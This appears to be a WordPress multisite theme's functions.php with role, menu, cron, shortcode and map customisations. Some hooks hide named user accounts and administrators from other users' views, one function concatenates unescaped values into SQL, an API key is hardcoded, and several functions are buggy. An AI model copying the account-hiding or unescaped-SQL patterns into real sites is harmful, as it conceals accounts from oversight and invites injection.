        $user_search->query_where = 
        str_replace('WHERE 1=1', 
            "WHERE 1=1 AND {$wpdb->users}.ID IN (
                 SELECT {$wpdb->usermeta}.user_id FROM $wpdb->usermeta 
                    WHERE {$wpdb->usermeta}.meta_key = '{$wpdb->prefix}user_level' 
                    AND {$wpdb->usermeta}.meta_value = 0)", 
            $user_search->query_where
        );

    }
} 

//------------------------------------------------------------------------------------------------- hide person from user 
add_action('pre_user_query','yoursite_pre_user_query2');
function yoursite_pre_user_query2($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'bracolist@hush.com') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'bracolist@hush.com'",$user_search->query_where);
  }
}


add_action('pre_user_query','yoursite_pre_user_query3');
function yoursite_pre_user_query3($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'jock@nyr.scot') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'jock@nyr.scot'",$user_search->query_where);
  }
}

add_action('pre_user_query','yoursite_pre_user_query4');
function yoursite_pre_user_query4($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'Master Admin') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Master Admin'",$user_search->query_where);
  }
}

//-----------------------------------------REMOVING REGIONAL ROLE
function nyr_user_role_dropdown($all_roles) {

    global $pagenow;
    global $current_user; 
    
    
    if (user_can($current_user, 'group_editor')  && $pagenow == 'user-new.php') {
        unset($all_roles['administrator']);
        unset($all_roles['regional_admin']);
        }

         if (user_can($current_user, 'group_editor')  && $pagenow == 'users.php') {
        unset($all_roles['administrator']);
        unset($all_roles['regional_admin']);
        }


    return $all_roles;
}
add_action('editable_roles','nyr_user_role_dropdown');






//------------------------------------------------------------------------------------------------------------- remove admin role from view
function wdm_user_role_dropdown($all_roles) {

    global $pagenow;

    if( current_user_can('group_editor') && $pagenow == 'users.php' ) {
        // if current user is editor AND current page is user's listing page
        unset($all_roles['administrator']);
		 unset($all_roles['indyapp_member']);
		  unset($all_roles['national_member']);
		   unset($all_roles['national_editor']);
		    unset($all_roles['regional_admin']);
		 
    }

    return $all_roles;
}
add_action('editable_roles','wdm_user_role_dropdown');

function user_role_dropdown($all_roles) {

    global $pagenow;

    if( current_user_can('group_editor') && $pagenow == 'user-new.php' ) {
        // if current user is editor AND current page is user's listing page
        unset($all_roles['administrator']);
		 unset($all_roles['restricted_member']);
		  unset($all_roles['indyapp_member']);
		 unset($all_roles['national_admin']);
		 unset($all_roles['national_member']);
		 unset($all_roles['national_editor']);
		  unset($all_roles['regional_admin']);

    }
	
	if( current_user_can('group_editor') && $pagenow == 'user-new-internet.php' ) {
        // if current user is editor AND current page is user's listing page
        unset($all_roles['administrator']);
		 unset($all_roles['restricted_member']);
		  unset($all_roles['indyapp_member']);
		  unset($all_roles['national_member']);
		  unset($all_roles['national_admin']);
		  unset($all_roles['national_editor']);
		   unset($all_roles['regional_admin']);
    }

    return $all_roles;
}
add_action('editable_roles','user_role_dropdown');




//------------------------------------------------------------------------------------------------------------- remove national admin role from view

function wdm_user_role_dropdown2($all_roles) {

    global $pagenow;

    if( current_user_can('group_editor') && $pagenow == 'users.php' ) {
        // if current user is editor AND current page is user's listing page
        unset($all_roles['national_admin']);
    }

    return $all_roles;
}
add_action('editable_roles','wdm_user_role_dropdown2');

function user_role_dropdown2($all_roles) {

    global $pagenow;

    if( current_user_can('group_editor') && $pagenow == 'user-new.php' ) {
        // if current user is editor AND current page is user's listing page
        unset($all_roles['national_admin']);
    }

    return $all_roles;
}
add_action('editable_roles','user_role_dropdown2');
//--------------------------------------------------------------------------------------



//-------------------------------------------------------------------------------------------------- Include Custom end point



class all_groups
{
    public function __construct()
    {
        $version = '2';
        $namespace = 'wp/v' . $version;
        $base = 'all-groups';
        register_rest_route($namespace, '/' . $base, array(
            'methods' => 'GET',
            'callback' => array($this, 'get_all_groups'),
        ));
    }

    public function get_all_groups($object)
    {
        $return = array();
        $return['groups'] = get_sites('public');
 		
        // Get site list
        $args = array(
            'public' => true,
            '_builtin' => false
        );
        $output = 'names'; // or objects
        $operator = 'and'; // 'and' or 'or'
        $sites = get_sites( $args, $output, $operator);
   
        return new WP_REST_Response($return, 200);
    }
}

add_action('rest_api_init', function () {
    $all_groups = new all_groups;
});

//--------------------------------------------------------------------------------------------------------------------------------- get all users plugin
//-------------------------------------------------------------------------------------------------------------------------- Rest Api user endpoint


//-----------------------------------------------

//--------------------------------------------------------------------------------------------------------------------------------- remove Your Profile button

// Run the function on admin_init
add_action('admin_init', 'remove_profile_menu');

// Removal function
function remove_profile_menu() {
  global $wp_roles;

  // Remove the menu. Syntax is `remove_submenu_page($menu_slug, $submenu_slug)`
  remove_submenu_page('users.php', 'profile.php');

  /* Remove the capability altogether. Syntax is `remove_cap($role, $capability)`
   * 'Read' is the only capability subscriber has by default, and allows access
   * to the Dashboard and Profile page. You can also remove from a specific user
   * like this:
   * $user = new WP_User(null, $username);
   * $user->remove_cap($capability); 
   */
  $wp_roles->remove_cap('subscriber', 'read');
}

//--------------------------------------------------------------------------------------------------------------------------------- get all sites in list
function theme_list_all_network_sites()
{
    global $wpdb;

    
	
	$result = '';
    $sites = array();
    $blogs = $wpdb->get_results($wpdb->prepare("SELECT * FROM $wpdb->blogs WHERE spam = '0' AND deleted = '0' and archived = '0' and public= %1'"));

    if(!empty($blogs))
    {
        foreach($blogs as $blog)
        {
            $details = get_blog_details($blog->blog_id);

            if($details != false)
            {
                $url = $details->siteurl;
                $name = $details->blogname;

                if(!(($blog->blog_id == 1) && ($show_main != 1)))
                {
                    $sites[$name] = $url;
                }
            }
        }

        ksort($sites);

        $count = count($sites);
        $current = 1;

        foreach($sites as $name=>$url)
        {
            $result.= '<a href="'.$url.'">'.$name.'</a>';
            $result.= ($current == $count) ? "\n" : ' | ';

            ++$current;
        }
    }

    return $result;
}
add_shortcode('network_list', 'theme_list_all_network_sites');
//------------------------------------------------------------------------------------------------------------------------------ new blog list
// Output a single menu item
function projects_menu_entry($id, $title, $link_self)
{
    global $blog_id;
    if ($id == $blog_id && !$link_self)
        return;
    echo '<p class="sites-list">';
    if ($id == $blog_id)
        echo '<strong>';
    $url = get_home_url($id);
    if (substr($url, -1) != '/') {
        // Note: I added a "/" to the end of the URL because WordPress
        // wasn't doing that automatically in v3.0.4. YMMV.
        $url .= '/';
    }
  echo '<a target="_blank" class="sites-anchor" href="' . $url . '">' . $title . '</a>';
  	//echo $title;
    if ($id == $blog_id)
        echo '</strong>';
    echo '</p>';
}
// Output the whole menu
// If $link_self is false, skip the current site -
// used to display the menu on the homepage
function projects_menu($link_self = true)
{
    global $wpdb;
    echo '<ul id="site_list">';
    projects_menu_entry(1, 'Home', $link_self);
    $blogs = $wpdb->get_results("
        SELECT blog_id
        FROM {$wpdb->blogs}
        WHERE site_id = '{$wpdb->siteid}'
        AND spam = '0'
        AND deleted = '0'
        AND archived = '0'
        AND blog_id != 1
		ORDER BY blog_id ASC
    ");
	//$blogs = $wpdb->get_col( $wpdb->prepare( $query, $wpdb->siteid) );

    $sites = array();
    foreach ($blogs as $blog) {
        $sites[$blog->blog_id] = get_blog_option($blog->blog_id, 'blogname');
		
    }
    natsort($sites);
    foreach ($sites as $blog_id => $blog_title) {
        projects_menu_entry($blog_id, $blog_title, $link_self);
    }
    echo '</ul>';
}
// Adds a [bloglist] shortcode, so I can embed the menu into the static homepage.
// Note: I originally put it directly into the template, but that didn't work
// with WPtouch.
add_shortcode('bloglist', function($atts)
{
    projects_menu(false);
}); 

//----------------------------------------------------------------------


function projects_menu_entry2($id, $title, $link_self)
{
    global $blog_id;
    if ($id == $blog_id && !$link_self)
        return;
    echo '<li class="sites-list-2">';
    if ($id == $blog_id)
        echo '<strong>';
    $url = get_home_url($id);
    if (substr($url, -1) != '/') {
        // Note: I added a "/" to the end of the URL because WordPress
        // wasn't doing that automatically in v3.0.4. YMMV.
        $url .= '/';
    }
  echo '<a class="sites-anchor-2" target="_blank" href="' . $url . 'wp-login.php/">' . $title . '</a>';
  	//echo $title;
    if ($id == $blog_id)
        echo '</strong>';
    echo '</li>';
}
// Output the whole menu
// If $link_self is false, skip the current site -
// used to display the menu on the homepage
function projects_menu2($link_self = true)
{
    global $wpdb;
    echo '<ul id="site_list">';
    projects_menu_entry2(1, 'Home', $link_self);
    $blogs = $wpdb->get_results("
        SELECT blog_id
        FROM {$wpdb->blogs}
        WHERE site_id = '{$wpdb->siteid}'
        AND spam = '0'
        AND deleted = '0'
        AND archived = '0'
        AND blog_id != 1
		ORDER BY blog_id ASC
    ");
	//$blogs = $wpdb->get_col( $wpdb->prepare( $query, $wpdb->siteid) );

    $sites = array();
    foreach ($blogs as $blog) {
        $sites[$blog->blog_id] = get_blog_option($blog->blog_id, 'blogname');
		
    }
    natsort($sites);
    foreach ($sites as $blog_id => $blog_title) {
        projects_menu_entry2($blog_id, $blog_title, $link_self);
    }
    echo '</ul>';
}
// Adds a [bloglist] shortcode, so I can embed the menu into the static homepage.
// Note: I originally put it directly into the template, but that didn't work
// with WPtouch.
add_shortcode('editor_login', function($atts)
{
    projects_menu2(false);
}); 

//---------------------------------------------------------------------------------------------------------------------------------------------
function get_users_with_role( $roles ) {
    global $wpdb;
    if ( ! is_array( $roles ) )
        $roles = array_walk( explode( ",", $roles ), 'trim' );
    $sql = '
        SELECT  ID 
        FROM        ' . $wpdb->users . ' INNER JOIN ' . $wpdb->usermeta . '
        ON          ' . $wpdb->users . '.ID =       ' . $wpdb->usermeta . '.user_id
        WHERE       ' . $wpdb->usermeta . '.meta_key  =  \'' . $wpdb->prefix . 'capabilities\'
        AND     (
    ';
    $i = 1;
    foreach ( $roles as $role ) {
        $sql .= ' ' . $wpdb->usermeta . '.meta_value    LIKE    \'%"' . $role . '"%\' ';
        if ( $i < count( $roles ) ) $sql .= ' OR ';
        $i++;
    }
    $sql .= ' ) ';
    $sql .= ' ORDER BY display_name ';
    $userIDs = $wpdb->get_col( $sql );
    return $userIDs;
}

//---------------------------------------------------------------------------------------------------------------------------------------- get users list
function get_clients() { 

	echo '<ul>';
    $users = array();
    $roles = array('administrator', 'group_editor_x', 'group_editor_y');

    foreach ($roles as $role) :
        $users_query = new WP_User_Query( array( 
            'fields' => 'all_with_meta', 
            'role' => $role, 
            'orderby' => 'display_name'
            ) );
        $results = $users_query->get_results();
        if ($results) $users = array_merge($users, $results);
		     echo '<li>' . $users . '</li>';
		echo '</ul>';
    endforeach;

    return $users;
}

//------------------------------------------------------------------------------------------------------------------- tinymce editor 

  
 //-------------------------------------------------------------------------- remove old roles from database
 
 


 //------------------------------------------------------------------------------------------------------ change Posts colum name
 
add_filter('manage_users_columns', 'column_posts');

function column_posts( $columns ) 
{
    $columns['posts'] = 'Tasks Completed';
    return $columns;
}

add_filter('manage_users_columns', 'column_names');
function column_names( $columns ) {
  unset($columns['name']);
  return $columns;
}
//-------------------------------------------------------------------------------------------------------------------------------

function blogs_of_user( $id ) {
    $blogs = get_blogs_of_user( $id );
    $html = '<ul>';
    foreach( $blogs as $blog ) {
        $html .= '<li>';
            $html .= '<a href="' . $blog->siteurl . '">' . $blog->blogname . '</a>';
        $html .= '</li>';
    }
    $html .= '</hl>';

    return $html;
}

add_shortcode( 'get_all_users_site', 'get_all_users_site_cb' );
function get_all_users_site_cb() {
    global $wpdb;
    $html = '';
    $allusers = $wpdb->get_results( "SELECT ID, user_nicename FROM {$wpdb->users}" );
    foreach ( $allusers as $u ) {
        $html .= $u->user_nicename;
        $html .= blogs_of_user( $u->ID );
    }
}


  //------------------------------------------------------------------------------------------ trim date-picker expired posts
 

//----------------------------------------------------------------------------------------------------------- remove menu items if not admin
function remove_menus()
{
    global $menu;
    global $current_user;
    get_currentuserinfo();

    if($current_user->user_level < 10)
    {
        $restricted = array(__('Pages'),
                            __('Media'),
                            __('Links'),
                            __('Custom Post Name'),
                            __('Comments'),
                            __('Appearance'),
                            __('Plugins'),
                            __('Users'),
                            __('Tools'),
                            __('Settings'),
                            __('Posts'),

        );
        end ($menu);
        while (prev($menu)){
            $value = explode(' ',$menu[key($menu)][0]);
            if(in_array($value[0] != NULL?$value[0]:"" , $restricted)){unset($menu[key($menu)]);}
        }// end while

    }// end if
}
add_action('admin_menu', 'remove_menus');



add_action('template_redirect', 'last_mod_header');

//--------------------------------------------------------------------------------------------------

function last_mod_header() {
    //Check if we are in a single post of any type (archive pages has not modified date)
    if( is_singular() ) {
        $post_id = get_queried_object_id();
        if( $post_id ) {
            header("Last-Modified: " . get_the_modified_time("D, d M Y H:i:s", $post_id) );
        }
    }}
//-------------------------------------------------------------------------------------------------------------======

if ( ! function_exists( 'register_api_field' ) ) {
	/**
	 * Backwards compat shim
	 */
	function register_api_field( $object_type, $attributes, $args = array() ) {
		_deprecated_function( 'register_api_field', 'WPAPI-2.0', 'register_rest_field' );
		register_rest_field( $object_type, $attributes, $args );
	}
}


//========================================================================================= 


function myprefix_custom_cron_schedule( $schedules ) {
    $schedules['hourly'] = array(
        'interval' => 3600, // Every hour
        'display'  => __( 'Once Hourly' ),
    );
    return $schedules;
}
add_filter( 'cron_schedules', 'myprefix_custom_cron_schedule' );

//Schedule an action if it's not already scheduled
if ( ! wp_next_scheduled( 'myprefix_cron_hook' ) ) {
    //wp_schedule_event( time(), 'every_six_hours', 'myprefix_cron_hook' );
	wp_schedule_event( time(), 'hourly', 'trash_cpt' );

}

///Hook into that action that'll fire every six hours
 add_action( 'trash_cpt', 'myprefix_cron_function' );

//create your function, that runs on cron
function myprefix_cron_function() {
    
	
	$now = date("Y-m-d");
    //$today  = date("Y-m-d", strtotime($now));
   $today  = date("Y-m-d", strtotime('+27 hours', $now));

    // Set our query arguments
    $args = array(
        'fields'         => 'ids', // Only get post ID's to improve performance
        'post_type'    => array('events','meetings'),
        'post_status'    => 'expired',
        'posts_per_page' => -1,
         'meta_query' => array(
					  array(
						'key' => 'date_picker',
						'value' => $today,
						'compare' => '<=',
						'type' => 'DATE'
  ))
);
    
    $q = get_posts( $args );

    // Check if we have posts to delete, if not, return false
    if ( !$q )
        return false;

    // OK, we have posts to delete, lets delete them
    foreach ( $q as $id )
        wp_trash_post( $id );
	
}






//add_action( 'init', 'register_daily_post_delete_event');

function register_daily_post_delete_event(){

    // As example, we need to get posts that has expired more than 7days ago
   // $past = strtotime( "today" ); //httpss://www.the-art-of-web.com/php/strtotime/
	//$today = date('Y-m-d', strtotime('-23 hours'));
	$now = date("Y-m-d");
    $today  = date("Y-m-d", strtotime('+25 hours', $now));
    // Set our query arguments
    $args = array(
        'fields'         => 'ids', // Only get post ID's to improve performance
        'post_type'    => 'events',
        'post_status'    => 'expired',
        'posts_per_page' => -1,
         'meta_query' => array(
					  array(
						'key' => 'date_picker',
						'value' => $today,
						'compare' => '<=',
						'type' => 'DATE'
  ))
);
    
    $q = get_posts( $args );

    // Check if we have posts to delete, if not, return false
    if ( !$q )
        return false;

    // OK, we have posts to delete, lets delete them
    foreach ( $q as $id )
        wp_delete_post( $id );
} 


//--------------------------------------------------------------------------- delete meetings

add_action( 'init', 'register_daily_post_delete_meeting');

function register_daily_post_delete_meeting(){
    // As example, we need to get posts that has expired more than 7days ago
   // $past = strtotime( "today" ); //httpss://www.the-art-of-web.com/php/strtotime/
	$today = date('Y-m-d', strtotime('-23 hours'));
    // Set our query arguments
    $args = array(
        'fields'         => 'ids', // Only get post ID's to improve performance
        'post_type'    =>  array ('meetings','events'),
        'post_status'    => 'published',
        'posts_per_page' => -1,
         'meta_query' => array(
					  array(
						'key' => 'date_picker',
						'value' => $today,
						'compare' => '<=',
						'type' => 'DATE'
  ))
);
    
    $q = get_posts( $args );

    // Check if we have posts to delete, if not, return false
    if ( !$q )
        return false;

    // OK, we have posts to delete, lets delete them
    foreach ( $q as $id )
        wp_trash_post( $id );  
} 

//--------------------------------------------

update_option('default_role','indyapp_member');


//--------------------------------------------------------------------------------------------------- ajax sign up


require_once( get_template_directory() . '/libs/custom-ajax-auth.php' );

//-----------------------------------------------------------------


/*
 * Copy the contents of this file into your theme's functions.php or place this file in your
 * theme's folder and include it like this: <?php include_once('ft-hide-admin-users.php');?>
 * 
 * Visit http://fullthrottledevelopment.com/how-to-hide-the-adminstrator-on-the-wordpress-users-screen
 * for more help
 */
 
// Enqueue jQuery


// Remove administrator from dropdowns
add_action( 'editable_roles' , 'ft_hide_adminstrator_editable_roles' );
function ft_hide_adminstrator_editable_roles( $roles ){
	if ( isset( $roles['administrator'] ) && !current_user_can('level_10') ){
		unset( $roles['administrator'] );
	}
	return $roles;
}

// Hide Administrator from list of users
add_action('admin_head' , 'ft_hide_administrator_user');
function ft_hide_administrator_user(){
	if ( !current_user_can('level_10') ){
		?>
		<script type='text/javascript' >
			jQuery(document).ready(function(){
			  var admin_count;
			  var total_count;
			  
			  // Grab Administrator Count
			  jQuery("#list-filter > .subsubsub > li > a:contains(Administrator)").each(function(){
			  	admin_count = jQuery(this).children('.count').text();
				admin_count = admin_count.substring(1, admin_count.length - 1);
			  });
			  
			  // Remove Administrator Filter
			  jQuery("#list-filter > .subsubsub > li > a:contains(Administrator)").parent().remove();
			  
			  // Update All Filter Count
			  jQuery("#list-filter > .subsubsub > li > a:contains(All)").each(function(){
			  	total_count = jQuery(this).children('.count').text();
				total_count = total_count.substring(1, total_count.length - 1) - admin_count;
				jQuery(this).children('.count').text('('+total_count+')');
			  });
			  
			  // Hide Administrator Table Rows
			  jQuery("#users > tr .administrator").parent().parent().remove();
			});
		</script>
		<?php
	}
}






//Enqueue the Dashicons script
// enqueue Dashicons
add_action( 'wp_enqueue_scripts', 'wdm_enqueue_dashicons' );
function wdm_enqueue_dashicons() {
     wp_enqueue_style( 'wdm-dashicons-font', get_stylesheet_directory_uri(), array('dashicons'), '1.0' );
}


//---------------------------------------- REORDER USERS

add_action('pre_user_search', 'change_user_order');

function change_user_order($query) {

    $query->query_orderby = ' ORDER BY user_login DESC';
}

//-------------------------------------------------------- silence migrate.min warning

// silencer script
function jquery_migrate_silencer() {
    // create function copy
    $silencer = '<script>window.console.logger = window.console.log; ';
    // modify original function to filter and use function copy
    $silencer .= 'window.console.log = function(tolog) {';
    // bug out if empty to prevent error
    $silencer .= 'if (tolog == null) {return;} ';
    // filter messages containing string
    $silencer .= 'if (tolog.indexOf("Migrate is installed") == -1) {';
    $silencer .= 'console.logger(tolog);} ';
    $silencer .= '}</script>';
    return $silencer;
}

// for the frontend, use script_loader_tag filter
add_filter('script_loader_tag','jquery_migrate_load_silencer', 10, 2);
function jquery_migrate_load_silencer($tag, $handle) {
    if ($handle == 'jquery-migrate') {
        $silencer = jquery_migrate_silencer();
        // prepend to jquery migrate loading
        $tag = $silencer.$tag;
    }
    return $tag;
}

// for the admin, hook to admin_print_scripts
add_action('admin_print_scripts','jquery_migrate_echo_silencer');
function jquery_migrate_echo_silencer() {echo jquery_migrate_silencer();}

//----------------------- replace error message when registering

add_filter('gettext', 'mycustom_func');
function mycustom_func($translated_text){
    if($translated_text == 'Sorry, that username already exists!'){
        $translated_text = 'Sorry, that email already exists!';
    }
    return $translated_text;
}

//---------------------------- replace message

add_filter('gettext', 'mycustom_func2');
function mycustom_func2($translated_text2){
    if($translated_text2 == 'Sorry, you are not allowed to edit this item.'){
        $translated_text2 = 'Sorry, you are not an Editor for this group.';
    }
    return $translated_text2;
}


function ac_custom_column_settings_1b0b3d99() {

	ac_register_columns( 'wp-users', array(
		array(
			'columns' => array(
				'5aaab0f519b13' => array(
					'type' => 'column-display_name',
					'label' => 'Member Name',
					'width' => '15',
					'width_unit' => '%',
					'sort' => 'on',
					'name' => '5aaab0f519b13'
				),
				'email' => array(
					'type' => 'email',
					'label' => 'Email',
					'width' => '20',
					'width_unit' => '%',
					'edit' => 'off',
					'sort' => 'on',
					'filter' => 'off',
					'filter_label' => '',
					'name' => 'email'
				),
				'role' => array(
					'type' => 'role',
					'label' => 'Role',
					'width' => '15',
					'width_unit' => '%',
					'edit' => 'off',
					'sort' => 'off',
					'filter' => 'off',
					'filter_label' => '',
					'name' => 'role'
				),
				'posts' => array(
					'type' => 'posts',
					'label' => 'Tasks Completed',
					'width' => '',
					'width_unit' => '%',
					'sort' => 'off',
					'name' => 'posts'
				)
			),
			
		)
	) );
}
add_action( 'ac/ready', 'ac_custom_column_settings_1b0b3d99' );


	// private message css
wp_enqueue_style('pm-styles', get_template_directory_uri() . '/tab-style.css');

//------------------------------------------------------------- slide nav

function my_custom_java() {
    echo '<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "280px";
    document.getElementById("main").style.marginLeft = "280px";
    document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
}

/* Set the width of the side navigation to 0 and the left margin of the page content to 0, and the background color of body to white */
function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
    document.getElementById("main").style.marginLeft = "0";
    document.body.style.backgroundColor = "white";
}
</script>


 <style>

#map-canvas {
        height: 400px;
        width: 100%;
		background: #555;
       }
	   #map-outer { 
	   padding: 20px;}
	   
	   
	   #info {
  color: #222;
}

.lngLat {
  color: #fff;
  margin-bottom: 5px;
}
.lngLat .one {
  padding-left: 250px;
}
.lngLat .two {
  padding-left: 34px;
}

#clipboard-btn {
  float: left;
  margin-right: 10px;
  padding: 6px 8px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
}

#info {
  height: 140px;
 margin: 0 auto;
 display: block;
  margin-bottom: 30px;
  border: solid 2px #eee;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;

}

#info, .lngLat {
  font-family: arial, sans-serif;
  font-size: 13px;
  padding-top: 10px;
    max-width: 280px;

}
	   
	   
	   
	   
	   
</style>

';
}
// Add hook for admin <head></head>
add_action('wp_head', 'my_custom_java');


// Add hook for admin <head></head>
add_action('admin_head', 'my_custom_java');


//------------------------------------------------------- new menu bar items

 
 
 
 
 if ( is_admin() ) {
     wp_enqueue_script( 'google-maps', '//maps.googleapis.com/maps/api/js?key=AIzaSyAO9se5f90ODYHBqVCAKGDDUTvIlWug4HI&libraries=drawing,geometryg' );

}
 




//----------------------------------- untrash post	
	
	
function delete_date_events() {
	global $post;
	$allposts = get_posts( 'numberposts=-1&post_type=events&post_status=trash' );
    foreach( $allposts as $postinfo ) {
    delete_post_meta( $postinfo->ID, 'date_picker', '' );
	
}}
add_action('init', 'delete_date_events');
	
function delete_date_meetings() {
	global $post;
	$allposts = get_posts( 'numberposts=-1&post_type=meetings&post_status=trash' );
    foreach( $allposts as $postinfo ) {
    delete_post_meta( $postinfo->ID, 'date_picker', '' );
	
}}
add_action('init', 'delete_date_meetings');
 
 
 
//----------------------------------------------------------


function my_custom_345() {
  echo " 
    



<script src='https://maps.google.com/maps/api/js?key=AIzaSyAO9se5f90ODYHBqVCAKGDDUTvIlWug4HI&libraries=drawing,geometry' type='text/javascript'></script>


";

	}
	
	// add_action('admin_head', 'my_custom_345');
    add_action('wp_head', 'my_custom_345', 3 );



function my_page_template_redirect()
{
  // if( is_page( array( 'area-map' , 'your-groups', '355' ) ) )
  if ( is_singular( 'regional' ) )
    {
         //wp_deregister_script('jquery');
       //wp_register_script('jquery', false);
         //  wp_enqueue_style('moe-bootstrap-multi-css', get_template_directory_uri() . '/css/bootstrap-multiselect.css');
         // Wp_enqueue_style('moe-bootstrap-css', get_template_directory_uri() . '/css/bootstrap-3.3.2.min.css');
          // wp_enqueue_script( 'moe-jquery-js', get_template_directory_uri() . '/js/jquery-2.1.3.min.js' );
          // wp_enqueue_script( 'moe-bootstrap-js', get_template_directory_uri(). '/js/bootstrap-3.3.2.min.js' );
         // wp_enqueue_script( 'moe-bootstrap-multi', get_template_directory_uri() . '/js/bootstrap-multiselect.js' );
		  
		  
		       wp_enqueue_script( 'moe-mapfunctions.js', get_template_directory_uri() . '/js/mapfunctions.js' );
	wp_enqueue_script( 'moe-polygonfunctions.js', get_template_directory_uri() . '/js/polygonfunctions.js' );
	   wp_enqueue_script( 'moe-coord-transform.js', get_template_directory_uri(). '/js/coord-transform.js' );
	wp_enqueue_script( 'moe-geotools.js', get_template_directory_uri(). '/js/geotools.js' );

		  wp_enqueue_script( 'moe-markerclusterer.js', get_template_directory_uri(). '/js/markerclusterer.js' );

          wp_enqueue_style('moe-mapstyle', get_template_directory_uri() . '/css/mapstyle.css');

    }
}
//add_action( 'template_redirect', 'my_page_template_redirect' );
 
 
 
//-------------------------------------------- postcode map


function my_page_postcode()
{
   if( is_page( array( 'area-map' ) ) )
    {
        // wp_deregister_script('jquery');
      // wp_register_script('jquery', false);
         //Wp_enqueue_style('moe-bootstrap-css', get_template_directory_uri() . '/css/bootstrap-3.3.2.min.css');
         wp_enqueue_script( 'moe-mapfunctions.js', get_template_directory_uri() . '/js/mapfunctions.js' );
	wp_enqueue_script( 'moe-polygonfunctions.js', get_template_directory_uri() . '/js/polygonfunctions.js' );
	   wp_enqueue_script( 'moe-coord-transform.js', get_template_directory_uri(). '/js/coord-transform.js' );
	wp_enqueue_script( 'moe-geotools.js', get_template_directory_uri(). '/js/geotools.js' );

		  wp_enqueue_script( 'moe-markerclusterer.js', get_template_directory_uri(). '/js/markerclusterer.js' );

          wp_enqueue_style('moe-mapstyle', get_template_directory_uri() . '/css/mapstyle.css');


    }
}
add_action( 'wp_enqueue_scripts', 'my_page_postcode' );


//global $pagenow;

//Check if current admin page is Option Tree settings

//if ( $pagenow == 'post.php' && $_GET['action'] == 'edit' ) {
    
     function orn_admin_register() {
    
     

           // wp_enqueue_script( 'js.wicketscript', get_template_directory_uri()."/js/wicketscript.js", array( 'jquery' ) ) ;
            // wp_enqueue_script( 'js.wicket', get_template_directory_uri()."/js/wicket.js");
            // wp_enqueue_script( 'wicket-gmap3.js', get_template_directory_uri()."/js/wicket-gmap3.js");
            wp_enqueue_script( 'bootstrap.min.js', get_template_directory_uri()."/js/bootstrap.min.js", array( 'jquery' ) );
            wp_enqueue_script( 'mytab.js', get_template_directory_uri()."/js/mytab.js");
           wp_enqueue_script( 'mymap.js', get_template_directory_uri()."/js/mymap.js");

            
      wp_enqueue_style('mytabcss.css', get_template_directory_uri().'/css/mytabcss.css', false);
    }

   add_action( 'admin_enqueue_scripts', 'orn_admin_register' ); 
    
    
    function orn_wp_register() {
  // if( is_page( 91)  )
   {

          //  wp_enqueue_script( 'js.wicketscript3', get_template_directory_uri()."/js/myfilex.js", array( 'jquery' ) ) ;
         //wp_enqueue_script( 'js.wicket', get_template_directory_uri()."/js/wicket.js");
          //  wp_enqueue_script( 'wicket-gmap3.js', get_template_directory_uri()."/js/wicket-gmap3.js");
            wp_enqueue_script( 'bootstrap.min.js', get_template_directory_uri()."/js/bootstrap.min.js", array( 'jquery' ) );
            wp_enqueue_script( 'mytab.js', get_template_directory_uri()."/js/mytab.js");
            wp_enqueue_script( 'mymap.js', get_template_directory_uri()."/js/mymap.js");
      wp_enqueue_style('mytabcss.css', get_template_directory_uri().'/css/mytabcss.css', false);
    }

}

 // add_action( 'wp_enqueue_scripts', 'orn_wp_register' );







 

//------------------------------------- add field to profile for notifications

//add_action( 'show_user_profile', 'my_show_extra_profile_fields' );
//add_action( 'edit_user_profile', 'my_show_extra_profile_fields' );

function my_show_extra_profile_fields( $user ) { ?>

	<h3>Extra profile information</h3>

	<table class="form-table">

		<tr>
			<th><label for="">Notification</label></th>

			<td>

				
				<input type="text" name="group_notification" id="group_notification" value="<?php echo esc_attr( get_the_author_meta( 'group_notification', $user->ID ) ); ?>" class="regular-text" /><br />

				<span class="description"></span>
			</td>
		</tr>

	</table>
<?php } ?>
<?php
 
//add_action('admin_menu', 'register_my_custom_submenu_page');
function register_my_custom_submenu_page() {
  add_submenu_page( 'edit.php?post_type=events', '', '', 'manage_options', 'add-group-info', 'my_custom_submenu_page_callback' ); 

 add_submenu_page( 'edit.php?post_type=events', '', '', 'manage_options', 'view-map', 'my_custom_submenu_page_callback2' ); 
}

    //include 'add-group-info.php';
    //include 'view-map.php';

?>